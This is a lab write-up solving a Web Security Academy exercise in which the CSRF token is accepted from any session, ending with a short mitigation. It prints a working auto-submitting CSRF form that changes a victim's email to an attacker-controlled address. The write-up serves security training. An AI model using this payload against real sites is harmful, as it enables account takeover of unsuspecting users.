# Lab 03 — CSRF token not tied to user session

> **Practitioner** · [Official lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

**Entry point:** the CSRF token is validated against a server-side store —
but **not** against the session that presents it.

## Solution

1. Get a **valid** token from your own session: change your email once and
   copy the `csrf` value from the request.
2. Test in Repeater with two sessions: token from session A is accepted
   inside session B — tokens are interchangeable.
3. Host the standard CSRF form using **your own valid token**:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="POST">
  <input type="hidden" name="email" value="attacker@evil-you.net">
  <input type="hidden" name="csrf" value="YOUR-VALID-TOKEN">
</form>
<script>document.forms[0].submit();</script>
```

4. Deliver to victim — their browser pairs their session with your (valid)
   token and the server accepts — lab solved.

## Mitigation

Bind the token cryptographically to the session (or use the double-submit
pattern with SameSite cookies).
